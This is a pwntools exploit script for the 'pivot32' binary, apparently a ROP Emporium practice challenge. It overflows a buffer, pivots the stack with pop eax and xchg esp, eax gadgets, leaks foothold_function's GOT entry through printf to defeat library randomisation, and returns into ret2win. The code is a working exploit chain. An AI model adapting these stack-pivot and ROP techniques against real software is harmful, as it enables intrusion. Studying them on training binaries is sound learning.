from pwn import *
import sys

# config
context(os="linux", arch="i386")
#context.log_level = "debug"

FILE_NAME = "./pivot32"
HOST = ""
PORT = 0

if len(sys.argv) > 1 and sys.argv[1] == "r":
    conn = remote(HOST, PORT)
else:
    conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
# addr_main=elf.symbols["main"]
# addr_bss=elf.bss()

buflen = 0x28+4

ret2win = 0x00000967
foothold_function = 0x00000770

foothold_function_plt = elf.plt['foothold_function']
printf_plt = elf.plt['printf']
main_addr = elf.symbols['main']
foothold_function_got = elf.got['foothold_function']


pop_eax = 0x080488c0
xchg_esp_eax = 0x080488c2


def main():
    conn.recvuntil(": ")
    pivot = int(conn.recv(10), 16)

    payload = p32(foothold_function_plt)
    payload += p32(printf_plt)
    payload += p32(main_addr)
    payload += p32(foothold_function_got)
    conn.sendlineafter("> ", payload)

    payload = b"A"*buflen
    payload += p32(pop_eax)
    payload += p32(pivot)
    payload += p32(xchg_esp_eax)

    conn.sendlineafter("> ", payload)

    conn.recvuntil("libpivot.so")
    base_addr = u32(conn.recv(4))-foothold_function
    payload = b"A"*buflen
    payload += p32(base_addr+ret2win)
    payload += b"B"*4
    conn.sendline()
    conn.sendlineafter("> ", payload)
    print(conn.recvall())


if __name__ == "__main__":
    main()
